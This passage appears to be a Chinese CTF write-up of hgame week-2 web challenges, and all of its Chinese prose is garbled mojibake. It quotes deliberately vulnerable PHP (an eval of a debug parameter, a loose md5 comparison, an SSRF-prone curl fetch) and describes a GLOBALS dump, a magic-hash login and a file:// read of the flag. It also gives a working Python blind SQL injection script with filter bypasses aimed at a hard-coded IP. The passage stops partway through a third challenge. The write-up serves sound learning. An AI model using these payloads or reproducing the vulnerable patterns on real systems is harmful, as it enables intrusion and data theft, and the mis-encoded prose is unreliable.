class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°admin.phpçš„å­˜åœ¨ï¼Œä»¥åŠlogin.phpå¯èƒ½å­˜åœ¨çŒ«è…»ã€‚ é‚£ä¹Ÿç”¨ä¼ªåè®®è¯»ä¸‹<br>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#htmléƒ¨åˆ†ç•¥</span></span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos<span class="string">'Blog - åå°ç®¡ç†&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;a href="logout.php"&gt;é€€å‡ºç™»é™†&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION['</span>username<span class="string">'];?&gt; &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;form action="" method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;æ’å…¥å›¾ç‰‡&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;label&gt;å›¾ç‰‡url: &lt;input type="text" name="img_url" placeholder=""&gt;&lt;/label&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;button type="submit" name="submit"&gt;æ’å…¥&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;float:left"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;è¯„è®ºç®¡ç†&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="width: 30%;height: 20%;"&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;æ–‡ç« åˆ—è¡¨&lt;/legend&gt;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;å¾…å¼€å‘..&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">        &lt;fieldset style="height: 50%"&gt;</span></span><br><span class="line"><span class="string">            &lt;div style="text-align: center;"&gt;</span></span><br><span class="line"><span class="string">                &lt;img height='</span><span class="number">200</span><span class="string">' width='</span><span class="number">500</span><span class="string">' src='</span>data:image/jpeg;base64,<span class="meta">&lt;?php</span> <span class="keyword">echo</span> insert_img() ? insert_img() : base64_encode(file_get_contents(<span class="string">"static/error.jpg"</span>)); <span class="meta">?&gt;</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸éš¾å‘ç°å‡ ä¸ªæºç é‡Œçš„è¦ç‚¹ï¼š<br>index.phpä¸­ï¼š<br>banæ‰äº†flagä¸configã€‚è€Œåé¢å¯ä»¥æ³¨æ„åˆ°config.phpè¢«admin.phpä¸login.phpåŒ…å«(include)äº†ã€‚</p><p>login.phpä¸­<br>1.å­˜åœ¨ä¸€ä¸ªå‚æ•°debug,ä»¥åŠå¯¹è¿™å‚æ•°çš„<code>eval()</code>ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸€ä¸ªå¯æ§å¯æ‰§è¡Œçš„å‚æ•°ï¼Œä½†æ˜¯è¦ç»•æ­£åˆ™ã€‚<br>2.ç¨å¾®æ³¨æ„ä¸‹ï¼Œç™»å½•æ—¶<code>username</code>ä»¥åŠ<code>password</code>å‡éœ€ä¸å¯¹åº”çš„å‚æ•°ï¼ˆè‚¯å®šåœ¨config.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å¯èƒ½é€šè¿‡å…¶ä»–é€”å¾„ç™»å½•ï¼‰ç›¸ç­‰ã€‚ä½†æ˜¯passwordååæ˜¯<code>==</code>çš„å¼±ç±»å‹ç›¸ç­‰ã€‚è¿™å°±ä»£è¡¨passwordä¸€å®šä¼šæœ‰æ¼æ´ã€‚ä¸”ç”šè‡³å¯ä»¥çŒœåˆ°ï¼Œpasswordçš„md5å€¼å¼€å¤´æ˜¯0eã€‚è¿™æ ·æ‰ä¼šæœ‰å¼±ç±»å‹æ¯”è¾ƒæ¼æ´åˆ©ç”¨ã€‚</p><p>admin.phpä¸­<br>1.ä¸‹é¢ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$c = curl_init();</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$res = curl_exec($c);</span><br><span class="line">curl_close($c);</span><br><span class="line">$avatar = base64_encode($res);</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹çœ¼ç†Ÿï¼Œå†åŠ ä¸Šå‰é¢ä¸€æ®µå¯¹hostçš„åˆ¤åˆ«ï¼Œå¯ä»¥æƒ³è§æ˜¯å­˜åœ¨ssrfæ¼æ´ã€‚ï¼ˆè™½ç„¶æˆ‘ä¸ç†Ÿï¼‰ç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°è¿™æœç„¶æ˜¯ssrfæ¼æ´çš„ç»å…¸ä»£ç ã€‚ä¹Ÿæé†’äº†æˆ‘è¦å‡†å¤‡å­¦ä¹ ssrfçš„ç¬”è®°äº†â€¦â€¦</p><p>ç„¶åå°±æ˜¯å­˜åœ¨ä¸€ä¸ªå›¾ç‰‡æ’å…¥çš„åŠŸèƒ½ã€‚è€Œä¸”å®ƒä¼šè¿”å›base64ç¼–ç åçš„<code>file_get_contents()</code>ç»“æœã€‚è¿™ä¹Ÿæ˜¯ssrfåˆ©ç”¨ä¸­èƒ½æ‹¿åˆ°å›æ˜¾ç»“æœçš„é‡è¦ç»†èŠ‚ã€‚</p><p>æ‰€ä»¥æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œä»login.phpä¸‹æ‰‹ï¼Œç™»å½•åå°ï¼Œåˆ©ç”¨ssrfæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagã€‚</p><p>é¦–å…ˆæ˜¯å…³äº<code>debug</code>å‚æ•°çš„åˆ©ç”¨äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯è¿™æ®µä»£ç ï¼Œè‡ªå·±å¼€å§‹åªç†è§£æˆè¿‡æ»¤äº†ä¸€å †ä¸œè¥¿â€¦â€¦åæ¥ç™¾åº¦ä¸‹ï¼Œçªç„¶æƒ³èµ·æ¥åŸæ¥ichunqiuä¸Šåšè¿‡çš„ä¸€é“é¢˜ã€‚å«åšçˆ†ç ´-1ã€‚ä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡çš„åˆ©ç”¨ï¼ˆå› ä¸ºå®ƒincludeäº†flag.php,æ‰€ä»¥ä¼ å‚<code>globals</code>å°±èƒ½é€šè¿‡<code>eval($$a)</code>æ‹¿flagï¼‰ã€‚è€Œè¿™é¢˜åŒæ ·ä¹Ÿincludeäº†config.phpâ€¦â€¦å›è¿‡å¤´çœ‹æ­£åˆ™ï¼Œå°±ä¼šå‘ç°è¿™ä¸ªæ­£åˆ™å…¶å®æ°å¥½é™å®šäº†ä¼ å‚ä¸ºå˜é‡åã€‚å…·ä½“å‚è€ƒstackoverflowï¼š<br><a href="https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php</a><br>å®ƒè¦æ±‚å¼€å¤´ç¬¬ä¸€ä¸ªå­—æ¯å¯ä»¥æ˜¯å­—æ¯ä¸‹åˆ’çº¿åŠä¸å¯è§å­—ç¬¦ï¼Œåé¢å…¶ä»–å­—æ¯å¯ä»¥æ˜¯å­—æ¯æ•°å­—åŠä¸å¯è§å­—ç¬¦ã€‚ï¼ˆ\x7f-\xff ç¡®åˆ‡çš„è¯´ï¼Œå¯ä»¥åŒ¹é…utf-8ç¼–ç ä¸­çš„éasciiç¼–ç å­—ç¬¦ï¼‰ã€‚æ€»ä¹‹ç¡®å®šå¯ä»¥ä¼ å‚æ•°åï¼Œæˆ‘ä»¬è¯•è¯•<code>GLOBALS</code><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="GLOBALS"><br>ç›´æ¥æ‹¿åˆ°ç”¨æˆ·åCosmos!ï¼Œä»¥åŠå¯†ç æ˜¯0eå¼€å¤´çš„äº‹å®ã€‚æ•…é€‰ä¸ª0eå¼€å¤´MD5çš„å­—ç¬¦ä¸²ç™»å½•è¿›å»ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cosmos!</span><br><span class="line">s878926199a</span><br></pre></td></tr></table></figure><p>è¿›å»åæˆ‘ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ssrfä¸ç†Ÿï¼Œåªèƒ½ç›²ç›®çš„è¯•ã€‚èƒ½ç¡®å®šçš„æ˜¯éœ€è¦hostè¢«è§£æä¸º<code>localhost</code>,å°è¯•ç›´æ¥<code>http://localhost</code>ä½†æ˜¯å›æ˜¾æ€»æ˜¯é‚£å¼ æŠ¥é”™çš„å›¾ã€‚å”¯ä¸€ä¸åŒçš„åœ¨äºï¼Œå½“æˆ‘å°è¯•<code>http://localhost/flag</code>æ—¶ï¼Œè¿”å›çš„æ˜¯404,ä¹Ÿå°±æ˜¯è¯´curlæˆåŠŸæ‰§è¡Œäº†ã€‚æ‰€ä»¥è¯´ï¼Œflagåº”è¯¥æ˜¯åœ¨æœåŠ¡å™¨æ ¹ç›®å½•ï¼Œä¸æ˜¯ç½‘ç«™æ ¹ç›®å½•ã€‚é—®é¢˜å˜ä¸ºæ€ä¹ˆè¯»äº†ã€‚åœ¨æŸ¥é˜…èµ„æ–™æ—¶çªç„¶æ³¨æ„åˆ°fileåè®®å¯ä»¥è¯»æ–‡ä»¶ã€‚äºæ˜¯æ¢ä¸‹file://åè®®<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag.PNG"><br>å±…ç„¶æˆäº†ã€‚ã€‚ã€‚è§£ç å¯æ‹¿åˆ°flagã€‚åæ¥éƒå¸ˆå‚…è§£é‡Šè¯´ï¼Œå› ä¸ºindex.phpå­˜åœ¨302ï¼Œcurlä¸èƒ½è·Ÿéšï¼Œè·å–æ˜¯ç©ºçš„ã€‚ç»“åˆæºç ä¸­è·å–ä¸ºç©ºåˆ™è¿”å›é”™è¯¯å›¾ç‰‡è¿™ç‚¹ï¼Œå°±æ˜ç™½äº†ä¸ºä»€ä¹ˆ<code>http://localhost</code>æ€»æ˜¯æ²¡ç»“æœ<br>ä½†æˆ‘ä¼°è®¡è¿˜æœ‰å…¶ä»–æ–¹æ³•åšï¼Œè¿™é‡Œé©¬ä¸€æ‰‹ã€‚</p><h1 id="Cosmosçš„ç•™è¨€æ¿-1"><a href="#Cosmosçš„ç•™è¨€æ¿-1" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-1"></a>Cosmosçš„ç•™è¨€æ¿-1</h1><p>è¯´æ¥æƒ­æ„§ï¼Œè¿™é¢˜å¼€å§‹æˆ‘ipåˆè¢«banäº†hhhhã€‚å¥½åœ¨è²Œä¼¼æ˜¯é¢˜ç›®é—®é¢˜ï¼Œåæ¥å‡ºé¢˜äººè°ƒæ•´äº†å°±å¥½äº†ã€‚é¦–å…ˆæ ¹æ®FUZZå¯ä»¥ç¡®è®¤å­˜åœ¨sqlæ³¨å…¥ã€‚è¾“å…¥1å›æ˜¾æ­£å¸¸ï¼Œè¾“å…¥<code>1&#39;</code>æ— å›æ˜¾ã€‚è¾“å…¥<code>1&quot;</code>å›æ˜¾æ­£å¸¸ã€‚é‚£ä¹ˆæ˜¾ç„¶ï¼Œè¿™æ˜¯ç›²æ³¨çš„å‘³é“ã€‚å› ä¸ºåªæœ‰æ­£ç¡®é”™è¯¯ä¸¤ç§å›æ˜¾æ–¹å¼ï¼Œæ‰€ä»¥ç¡®è®¤æ˜¯å¸ƒå°”ç›²æ³¨ã€‚</p><p>ç„¶åfuzzäº†ä¸‹banæ‰çš„å…³é”®å­—ï¼š<br>ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>%0a</code>æ›¿ä»£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></figure><p>å…³é”®å­—å¯ä»¥åŒå†™ç»•è¿‡</p><p>é‚£ä¸å¤šè¯´ç›´æ¥æ”¾ç›²æ³¨è„šæœ¬äº†ã€‚æ•´ä½“è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ˆä¹‹å‰æ€»ç»“çš„æ¨¡æ¿ç›´æ¥æ‹¿æ¥å¥—hhhï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="comment">#hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"http://139.199.182.61/index.php?id=1'and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">        <span class="comment">#print(payloadï¼‰</span></span><br><span class="line">        res=requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>: <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="Cosmosçš„æ–°è¯­è¨€"><a href="#Cosmosçš„æ–°è¯­è¨€" class="headerlink" title="Cosmosçš„æ–°è¯­è¨€"></a>Cosmosçš„æ–°è¯­è¨€</h1><p>è¿™é“é¢˜ç¡®åˆ‡è¯´ä¸ç®—éš¾é¢˜å§ã€‚ä½†æ˜¯è‡ªå·±ä»ç„¶è€—è´¹äº†2ä¸ªå¤šå°æ—¶åœ¨è¿™ä¸Šé¢ï¼Œæ„Ÿè§‰æŒºåˆ’ä¸æ¥çš„â€¦â€¦</p><p>è¯ä¸å¤šè¯´ï¼Œå…ˆçœ‹é¢˜ç›®<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æºç "></p><p>åˆå§‹è¿›å»å‘ç°æœ‰æºç åŠå›æ˜¾ã€‚<br>æºç å¾ˆç®€æ´ï¼Œå…³é”®åœ¨äº<code>file_get_contents(&#39;mycode&#39;);</code>å¼€å§‹ä¹ æƒ¯æ€§ä»¥ä¸ºæ˜¯<code>file_get_contents()</code>çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ä½†æ˜¯ä»”ç»†çœ‹ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å¯æ§å‚æ•°ã€‚å› ä¸ºè¿™é‡Œçš„<code>&#39;mycode&#39;</code>æŒ‡ä»£çš„å…¶å®æ˜¯filename,å¦‚æœæœ‰ç–‘é—®ï¼Œé‚£ä¹ˆä¸å¦¨æ”¾åˆ°phpä¸­çœ‹çœ‹<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="filename"><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œmycodeæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”å›æ˜¾çš„ä¸çŸ¥åå†…å®¹ä¹Ÿæ˜¯mycodeé‡Œé¢çš„ã€‚</p><p>å›æ˜¾å°±ä¸ç®€å•äº†ï¼Œçœ‹ä¼¼æ˜¯base64ï¼Œä½†è§£ç åä»ç„¶æ˜¯æœªçŸ¥ç¼–ç ã€‚é‚£ä¹ˆæˆ‘ä»¬ä»mycodeä¸‹æ‰‹ã€‚ç”±æºç å¯çŸ¥ï¼Œmycodeåº”è¯¥æ˜¯è·Ÿindex.phpåœ¨åŒä¸€ä¸ªç›®å½•ä¸‹çš„ï¼Œæ•…è®¿é—®ä¹‹ã€‚å¾—åˆ°æºç <br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="mycode"><br>å¯ä»¥çŸ¥é“ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå¹¶å¯¹<code>$_SERVER[&#39;token&#39;]</code>è¿›è¡Œäº†å¤šé‡ç¼–ç ã€‚åªè¦æˆ‘ä»¬postçš„tokenä¸æœåŠ¡å™¨çš„tokenç›¸åŒå³å¯æ‹¿åˆ°flagã€‚</p><p>å¼€å§‹æˆ‘æƒ³ï¼Œè¿™ä¸æ˜¯å¾ˆç®€å•å—ï¼ŒæŠŠç¼–ç å€’è¿‡æ¥è§£ç ä¸å°±å¥½äº†ï¼Ÿä½†æ˜¯è§£å‡ºtokenåå‘ç°æ²¡æœ‰æ‹¿åˆ°flagï¼Œä»”ç»†å›åˆ°åŸé¡µé¢ï¼Œå‘ç°ä¸€ä¸ªå¤§é—®é¢˜ï¼š<br>mycodeä¸­ç”¨äºåŠ å¯†<code>$_SERVER[&#39;token&#39;]</code>çš„æºç æ˜¯å˜åŒ–çš„ã€‚å”¯ä¸€ä¸å˜çš„æ˜¯åŠ å¯†å‡½æ•°çš„æ•°é‡æ€»æ˜¯10ä¸ªï¼Œè€ŒåŠ å¯†å‡½æ•°çš„ç§ç±»åªæœ‰<code>encrypt()</code>,<code>base64_encode()</code>,<code>strrev()</code>,<code>str_rot13()</code>è€Œè¿™ä½“ç°åœ¨index.phpä¸Šå›æ˜¾çš„å†…å®¹ä¹Ÿæ˜¯ä¸æ–­å˜æ¢çš„ã€‚ä¸”åŸºæœ¬ä¸Šå‡ ç§’é’Ÿå°±æ¢æ‰äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ï¼Œè€Œä¸å¯èƒ½äººæ‰‹è§£å†³ã€‚<br>(å½“ç„¶ï¼Œä¹Ÿè®¸å¯ä»¥æŠŠå‡ ç§å­¤é›¶é›¶çš„åŠ å¯†é¡ºåºçš„å¯èƒ½æ€§ä¸æ–­è¯•ä¹Ÿè®¸åˆšå¥½ç¢°å¯¹äº†ã€‚ä½†è¿™æ— 